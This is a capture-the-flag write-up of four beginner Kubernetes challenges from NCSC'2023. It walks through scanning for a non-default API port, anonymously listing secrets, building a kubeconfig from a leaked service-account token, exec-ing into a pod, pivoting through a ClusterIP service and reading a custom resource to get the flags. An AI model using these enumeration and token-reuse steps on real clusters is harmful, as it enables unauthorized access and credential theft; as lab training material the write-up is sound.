
# Kubernetes challenge serie

NCSC'2023 consider the 1st tunisian CTF competition that have a whole Kubernetes Category! These are oriented for beginners/Intermediate users to consodilate their basic knowledge in Kubernetes!

![](https://imgur.com/U69KQtM.png)

## Kubernetes: Secrets:
In this challenge we get an IP and the author told us that he have a secret in the cluster! 
![](https://imgur.com/PCmO273.png)

Visiting the IP on the browser will lead us to the author page! This is not our objective! 

We need to access to the API-Server. Let's check the default port 6443

```bash curl
curl -sk https://20.169.73.19:6443/version
```
And this request is failed! Mmmm The author change the default api-server?? Nmap time! Let's scan that IP! 

After checking the IP we get that port opened 7443! 

![](https://imgur.com/GunNYhA.png)

And Yes! We got a response! It's KUBERNETES TIME!! 

Let's check what permission we have as an anonymous users! To be honest I'll try to check if I can got namespaces Or secrets first! Let me check that! 

```bash curl-namespaces
curl -sk https://20.169.73.19:7443/api/v1/namespaces | grep '"name": "'
```
And we got a list of namespaces! This is cool! We have `task1,task2,task3 and task4` namespaces! I bet that each challenge is in single namespace! This is Great! 
![](https://imgur.com/vZrtZLd.png)

Hummm We need secrets and this is the 1st challenge! So We are sure that we can list the secrets in the `task1` namespace! 

```bash curl-namespaces
curl -sk https://20.169.73.19:7443/api/v1/namespaces/task1/secrets
```
Bingo We got the Secrets List! We are on the right way! 
![](https://imgur.com/0PFJsCI.png)

Flag : `Securinets{S3crEts_Ar3_S0_CriT1c4LL}`

> We got a message! We must check it for sure! 

Look what we got here ! 

```text check
Look here YOU will need this one believe me!!!
 eyJhbGciOiJSUzI1NiIsImtpZCI6IkZwcWlIMGR2QlJ5Q0ZwTHV5a0JFQnlEcVI5UWZHLUdsY2NLQkkyMGlZWU0ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJ0YXNrMiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJwb2QtbGlzdGVyLXRva2VuLXpoNHM2Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6InBvZC1saXN0ZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyZjc2YjA3ZS0wY2NjLTRhMDQtYWUxZi1jNGJhMzIxZjYzZmQiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6dGFzazI6cG9kLWxpc3RlciJ9.cewI8cdU8u-MxhLW5enn9bqj2DnD6Kn6iJZD2Y70uSIN-Pdq4VGrCNN0oB0edWaNZd_2o3NCVfE1GY9JRIjQeMuV_Uk5-tEQ62TS1b2hpHPoq8FtRFDyji26LyTR2XGU7gSYdQV6G8axOU3z8_RRWQarN5VfSgDp-WmwizjwWJLMhENGgvWBxOKjHrF0tDCEmshH1g841NB4XtzeiXRxEC1AN9kNv-7SZvYWasHbPuva-fsGBp-AvhUUTStcCVahZ8VElJ51q3VxKBTXX-DoDWfsVD5rOcCse0yj4jxgN3GIqjIaAcjBiPI2XmhQv-tMMbYpj7gfAxrzhdh77UfaBg
```

## Kubernetes: Pody:

After getting the secrets we can move to the next challenge that named `Pody`

![](https://imgur.com/hZQya2W.png)

In this challenge the author told us that the container is inside a pod! So how can we get inside that pod? Thinking a little bit we didn't get any solution expect opening a shell session inside the pod! 

Kubectl Are you there?? Yes! It's Kubectl time! I love to work with kubectl I will not waste my time curling endpoints :) So I'll make my kubeconfig file for this challenge! 

When I checked the secrets in the previous challenge I got the certificate authority Certifcate. And of course don't forget the token that we got! 

> This token is used for authentication and authorization in kubernetes. This authorization is occur on the api-server level not the etcd! 

Let's make our kubeconfig! But wait! In case you don't have kubectl, it's time to install it! You can follow this [guide](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/) to install it

```yaml kubeconfig
apiVersion: v1
kind: Config
clusters:
- cluster:
    certificate-authority-data:  LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUMvakNDQWVhZ0F3SUJBZ0lCQURBTkJna3Foa2lHOXcwQkFRc0ZBREFWTVJNd0VRWURWUVFERXdwcmRXSmwKY201bGRHVnpNQjRYRFRJek1ETXdOVEV5TWpVMU1sb1hEVE16TURNd01qRXlNalUxTWxvd0ZURVRNQkVHQTFVRQpBeE1LYTNWaVpYSnVaWFJsY3pDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBTDEzCm0rOG5ySVlXU21hQjREMU9yWWJVS1hycE4rS2ZUZDk1TjA2UTQ5U3IyUU1FZkZXZHhjSGJadThRVWRIVXo1dFcKdmVvRnk4cFBpcmhhNHdGYnJEbXczdFp4NlgxbGxEZlp4b29jd1ZBOS9pMTBjNGE4TURvOGVuc1hlYWU1TytZcQpMZmdiM04zcWZYYjZmSHAzekwxeHJzWThPUEZVeHhmU3AxaElXa0RNZ0tZY0lhU2NoRVUzYTk0ZityY2tIOUFwCnltRi95TlB3bXgyU1RFZUVFSkZoZFdWUzVVamdSTmxnNzFPWklyb05DMXMzWEJxb2RiZ1FWUjBUeTI5bnJGc0QKQnBJQW1WQVRCS3QxTjcyRjRMRDA0c3M3QVUxU0NDSCtoUmlrTWE1ZkdtOTBjMWRacEVuZ1IyVEUwSzZ4WVY3TAplOElrcE5WOVBaLy9RT2ZqSnFFQ0F3RUFBYU5aTUZjd0RnWURWUjBQQVFIL0JBUURBZ0trTUE4R0ExVWRFd0VCCi93UUZNQU1CQWY4d0hRWURWUjBPQkJZRUZBWWUzVktNRDY3T3V5NWhWTGxTN0RWeU52SExNQlVHQTFVZEVRUU8KTUF5Q0NtdDFZbVZ5Ym1WMFpYTXdEUVlKS29aSWh2Y05BUUVMQlFBRGdnRUJBSE9EMUNTNGQzNjJLRXE1dTZyQwpQOEF6a3hDMTJDdVF1bDh4aUVTajZ4M25wb25oT2M3WU0zRUhQZk5wNHRDZmNsdFpDMU51SXNrVDRuSkRLRTFYCjRNVFNOL0kxVDlGSHd5SUhNbDZMZm1RL1ZLVlo1YlZJMEZlUENQanFnOWZSbHFYaitsRUxJQnRJVE0xbUlmeW0KZlZmMisrS3h4OTFTME54bWRKUzU0amY1SUJMRVh2SnRiWFYrblZ1ekhER3l5eDREblVDMm4zR3NrcEtBOGRJRQpZZktRWk5IZjJ4L0FySWM2a3A0em9TSWI1RVQvdDk4b3p5R2pldlVnbDd1L0orUzkwTS9pWWgyaGlGSXRRVE1WCnBTa0pQM1lIbDlzWVRSS0dXZTBtcEtnVm1RZm9VTVNzdURrRnZ4ZFNhVG9QQUN6aUdxdUNnVXVyWHMxNXJjOWkKR2xBPQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==
    server: https://20.169.73.19:7443
  name: raf-k8s
contexts:
- context:
  name: ncsc-sa@raf-k8s
  context:
    cluster: raf-k8s
    user: ncsc-sa
current-context: ncsc-sa@raf-k8s
users:
- name: ncsc-sa
  user:
    token: eyJhbGciOiJSUzI1NiIsImtpZCI6IkZwcWlIMGR2QlJ5Q0ZwTHV5a0JFQnlEcVI5UWZHLUdsY2NLQkkyMGlZWU0ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJ0YXNrMiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJwb2QtbGlzdGVyLXRva2VuLXpoNHM2Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6InBvZC1saXN0ZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyZjc2YjA3ZS0wY2NjLTRhMDQtYWUxZi1jNGJhMzIxZjYzZmQiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6dGFzazI6cG9kLWxpc3RlciJ9.cewI8cdU8u-MxhLW5enn9bqj2DnD6Kn6iJZD2Y70uSIN-Pdq4VGrCNN0oB0edWaNZd_2o3NCVfE1GY9JRIjQeMuV_Uk5-tEQ62TS1b2hpHPoq8FtRFDyji26LyTR2XGU7gSYdQV6G8axOU3z8_RRWQarN5VfSgDp-WmwizjwWJLMhENGgvWBxOKjHrF0tDCEmshH1g841NB4XtzeiXRxEC1AN9kNv-7SZvYWasHbPuva-fsGBp-AvhUUTStcCVahZ8VElJ51q3VxKBTXX-DoDWfsVD5rOcCse0yj4jxgN3GIqjIaAcjBiPI2XmhQv-tMMbYpj7gfAxrzhdh77UfaBg
```
This kubeconfig file will allow us to authenticate to the api-server using kubectl utility without wasting time specifying the token and other stuff!

Assume that you save that file in name `ncsc-k8s.conf`. Let's export the KUBECONFIG env var.

```bash
$ export KUBECONFIG=ncsc-k8s.conf
$ kubectl get pods -n task2 
NAME      READY   STATUS    RESTARTS        AGE
web-app   1/1     Running   3 (2d19h ago)   17d
```
Bingo !! We got access and everything is ok until now. Let's describe the pod and check what we have first before getting a shell !

```bash describe pod
kubectl describe pod web-app -n task2   
Name:             web-app
Namespace:        task2
...
...
    Mounts:
      /etc/nginx/flag.txt from flag-configmap (rw,path="flag.txt")
      /var/cache/nginx from tmpfs-2 (rw)
      /var/run from tmpfs-1 (rw)
      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-wrfpc (ro)
...
```
Wow there is `flag.txt` file inside the pod! Let's be more accurate! The flag is in `/etc/nginx/flag.txt`

Let's get a shell or run a command from the pod using the `kubectl exec` command! 

![](https://imgur.com/6QTqehO.png)

Yes we got the flag! And another message: Your current token is enough! 

> I tried to delete the flag! But as expected the author make the pod Read-only file system

Flag : `Securinets{Ex3c_1s_DAnGer0uS_B3_C4r3fUL}`

## Kubernetes: Hidden? :

We still have the same token! Our kubectl works fine. So no worries we can do it! 

![](https://imgur.com/1Eny78d.png)

In this challenge the flag is hidden?? But how!? Let's check first what can we do in our `task3` namespace

```bash service
kubectl get service -n task3        
NAME      TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)   AGE
web-app   ClusterIP   10.109.128.98   <none>        80/TCP    17d
```
We can access to services! In case you don't know what is service I recommend to check this [page](https://kubernetes.io/docs/concepts/services-networking/service/). As we understand, There is a pod inside task3 namespace but we don't have any access to it :(!. No worries we still have services! This service as we can see its attached to that pod. Let's get our flag! 

After a little bit of thinking, I got an idea! Let's access to the service from our previous pod! 

YES MAN! pods and services can communicate between each others 

![](https://imgur.com/uq3xAoV.png)

Ok let's do it then, we have the service internal IP and we can run curl command inside our previous pod! 

![](https://imgur.com/DuPq2Sp.png)

Bingo! Flag: `Securinets{K8s_S3rV1cEs_ArE_P0wErFull}`
And as Usual! another token for the next challenge :
```text 
In The Next Challenge You will Need This one!
 eyJhbGciOiJSUzI1NiIsImtpZCI6IkZwcWlIMGR2QlJ5Q0ZwTHV5a0JFQnlEcVI5UWZHLUdsY2NLQkkyMGlZWU0ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJ0YXNrNCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJuY3NjLXBhcnRpY2lwYW50LXRva2VuLTdnZ2JxIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6Im5jc2MtcGFydGljaXBhbnQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIwNmM3OGJhZC01NjAwLTQ2N2QtYjdhYi0wNWQzN2RjMjg0MzIiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6dGFzazQ6bmNzYy1wYXJ0aWNpcGFudCJ9.exWa8skN0HdscxzG2PBFYn9eU9l_sL7hAjUw8sFPsnjUKHPHzmqwDpN4WfSPCHFOfv7KKimYvr9SuMjB75KuapxXKnyBwEaIZEkH3c0lavBCPYfGou_BrVsAHVSdbw6pQ9YYonuc3WTiGkcXC-XjKXfY8PGppmnGh7gUsuxY9xwpju10PutjIs8s0g9z2tTBYUhOraa54WRCODDGw-o415rXsaVHuV8A2Cj3jQZVBzXXi5-snfvjX27-nMyGDh4F0gu8sXD3PZfLjLdrOQpP6s_jzbUN9G1g8iLQTXNjCvgUw2cnBOvWtRGLtbdizOazlKUyJAOSXfmu3W45bMJPOg
```
## Kubernetes: Special :

After getting the new token it's time to edit the kubeconfig file! Just replace the old toke by the new one! To work with kubectl correctly! 

![](https://imgur.com/iFClk1V.png)

Something Special?? What a special? Everything in Kubernetes is SO Special!! So no worries, We can deal with that kind of things!

Talking about something special take me to think about what we can call it `Custom Resources Definition` in Kubernetes!

In Kubernetes, a custom resource is an extension of the Kubernetes API that allows you to define your own custom resources with their own custom controllers.

A custom resource definition (CRD) is used to create a new custom resource type in Kubernetes. A CRD defines the structure and behavior of the new custom resource, including its name, attributes, and API endpoints. Once a CRD is defined, instances of the custom resource can be created and managed using Kubernetes tools like kubectl and the Kubernetes API.

```bash api-resources
kubectl api-resources
NAME                              SHORTNAMES                                      APIVERSION                             NAMESPACED   KIND
bindings                                                                          v1                                     true         Binding
componentstatuses                 cs                                              v1                                     false        ComponentStatus
configmaps                        cm                                              v1                                     true         ConfigMap
...
...
rolebindings                                                                      rbac.authorization.k8s.io/v1           true         RoleBinding
roles                                                                             rbac.authorization.k8s.io/v1           true         Role
priorityclasses                   pc                                              scheduling.k8s.io/v1                   false        PriorityClass
ncscctfs                                                                          securinets.com/v1alpha1                true         NCSCCtf
```
But wait! I am right! There is an api-group and a custom resource called ncscctfs! 

Now it's time to get the flag!

```bash get
kubectl get ncscctfs -n task4           
NAME   AGE
flag   17d
```
And yes there is a ncscctf resource named flag! Let's describe that thing and get the flag! 

```bash describe
kubectl describe ncscctfs flag -n task4 
```

![](https://imgur.com/DhelAJU.png)

Flag: `Securinets{CuSt0m_REs0urcEs_ArE_P0wErFul}`
